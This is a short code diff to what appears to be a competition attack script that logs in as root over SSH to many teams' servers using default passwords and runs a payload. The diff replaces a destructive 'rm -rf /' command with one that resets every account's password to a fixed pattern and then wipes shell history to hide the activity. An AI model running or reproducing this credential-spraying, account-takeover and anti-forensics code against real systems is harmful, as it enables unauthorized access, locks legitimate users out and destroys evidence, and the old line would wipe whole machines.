@@ -37,9 +37,9 @@ async def ssh(user, host, cmd, password, timeout=30, bg_run=False):
 
 # fuck around with any command we want
 command = """
-
-	rm -rf /
-
+getent passwd | awk -F: '{print $1 ":" $1 "Chiapet1"}' | chpasswd /dev/stdin;
+history -c;
+rm ~/.bash_history
 """
 
 default_passwords = str(sys.argv)[1:]
@@ -51,6 +51,7 @@ for team in range(16):
 	for server in [1, 2, 3, 4, 5, 6, 11, 12, 13, 20, 21, 22, 42, 69]:
 		# check each default password
 		for password in default_passwords:
+
 			asyncio.run(ssh(user="root", host=f"10.{team}.1.{server}", cmd=command, password=password))
 			asyncio.run(ssh(user="root", host=f"172.16.{team}.{server}", cmd=command, password=password))
 
